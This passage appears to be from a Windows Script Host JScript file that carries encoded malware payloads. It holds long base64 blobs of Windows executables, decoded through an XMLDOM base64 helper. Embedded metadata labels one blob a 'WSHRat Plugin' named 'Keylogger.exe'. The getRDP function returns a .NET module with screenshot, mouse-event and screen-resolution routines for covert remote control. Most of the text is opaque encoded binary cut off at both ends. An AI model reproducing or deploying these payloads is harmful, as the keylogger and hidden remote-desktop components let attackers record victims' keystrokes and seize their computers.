AeQBOAGEAbQBlAAAAAABXAFMASABSAGEAdAAgAFAAbAB1AGcAaQBuAAAANAAGAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAGsAbABwAGwAdQAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADEALgAwAC4AMAAAADwADgABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAASwBlAHkAbABvAGcAZwBlAHIALgBlAHgAZQAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADEAOQAAAEQADgABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABLAGUAeQBsAG8AZwBnAGUAcgAuAGUAeABlAAAALAAGAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABrAGwAcABsAHUAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMQAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAxAC4AMAAuADAAAAAAAAAAKAAAACAAAABAAAAAAQAEAAAAAACAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAACAgIAAwMDAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHd3d3d3d3d3d3d3d3d3cARERERERERERERERERERHAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAEiIiIiIiIiIiIiIiIiIRwBEREREREREREREREREREcARMTExMTExMTExOzs5JdHAEzMzMzMzMzMzMzMzMzMQAAERERERERERERERERERAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/////////////////////AAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAPAAAAH////////////////KAAAABAAAAAgAAAAAQAEAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAACAgIAAwMDAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAd3d3d3d3d3REREREREREdP///////4R0////////hHT///////+EdP///////4R0////////hHT///////+EdP///////4R0////////hHSIiIiIiIiEdMzMzMzMzMR8RERERERETAAAAAAAAAAAAAAAAAAAAAAP//AACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA//8AAP//AAAAAAEAAgAgIBAAAQAEAOgCAAACABAQEAABAAQAKAEAAAMAAAAAAAAA77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KPGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAAMAAAAsDEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	var spike = (WScript.CreateObject("Microsoft.XMLDOM")).createElement("tmp");
	spike.dataType = "bin.base64";
	spike.text = encoded;
	return spike.nodeTypedValue;
}

function getRDP(){
	var encoded = "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EAApAIMCAAAAACsAgwI3AEkCNwBgAwIAFQADABUAAAAAPE1vZHVsZT4AbXNjb3JsaWIATWljcm9zb2Z0LlZpc3VhbEJhc2ljAE15QXBwbGljYXRpb24AUkRQLk15AE15Q29tcHV0ZXIATXlQcm9qZWN0AE15Rm9ybXMATXlXZWJTZXJ2aWNlcwBUaHJlYWRTYWZlT2JqZWN0UHJvdmlkZXJgMQBHcmFwaGljc0hhbmRsZXIAUkRQAFByb2Nlc3NEUElBd2FyZW5lc3MATW9kdWxlMQBNb3VzZUV2ZW50AFJlc291cmNlcwBSRFAuTXkuUmVzb3VyY2VzAE15U2V0dGluZ3MATXlTZXR0aW5nc1Byb3BlcnR5AE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5BcHBsaWNhdGlvblNlcnZpY2VzAENvbnNvbGVBcHBsaWNhdGlvbkJhc2UALmN0b3IATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkRldmljZXMAQ29tcHV0ZXIAU3lzdGVtAE9iamVjdAAuY2N0b3IAZ2V0X0NvbXB1dGVyAG1fQ29tcHV0ZXJPYmplY3RQcm92aWRlcgBnZXRfQXBwbGljYXRpb24AbV9BcHBPYmplY3RQcm92aWRlcgBVc2VyAGdldF9Vc2VyAG1fVXNlck9iamVjdFByb3ZpZGVyAGdldF9Gb3JtcwBtX015Rm9ybXNPYmplY3RQcm92aWRlcgBnZXRfV2ViU2VydmljZXMAbV9NeVdlYlNlcnZpY2VzT2JqZWN0UHJvdmlkZXIAQXBwbGljYXRpb24ARm9ybXMAV2ViU2VydmljZXMAQ3JlYXRlX19JbnN0YW5jZV9fAFN5c3RlbS5XaW5kb3dzLkZvcm1zAEZvcm0AVABJbnN0YW5jZQBEaXNwb3NlX19JbnN0YW5jZV9fAGluc3RhbmNlAFN5c3RlbS5Db2xsZWN0aW9ucwBIYXNodGFibGUAbV9Gb3JtQmVpbmdDcmVhdGVkAEVxdWFscwBvAEdldEhhc2hDb2RlAFR5cGUAR2V0VHlwZQBUb1N0cmluZwBnZXRfR2V0SW5zdGFuY2UAbV9UaHJlYWRTdGF0aWNWYWx1ZQBHZXRJbnN0YW5jZQBTZXRQcm9jZXNzRHBpQXdhcmVuZXNzAHZhbHVlAFNldERwaUF3YXJlbmVzcwBHZXRTY3JlZW5SZXNvbHV0aW9uAFRha2VTaG9vdABxdWFsaXR5AFN5c3RlbS5EcmF3aW5nAEJpdG1hcABJbWFn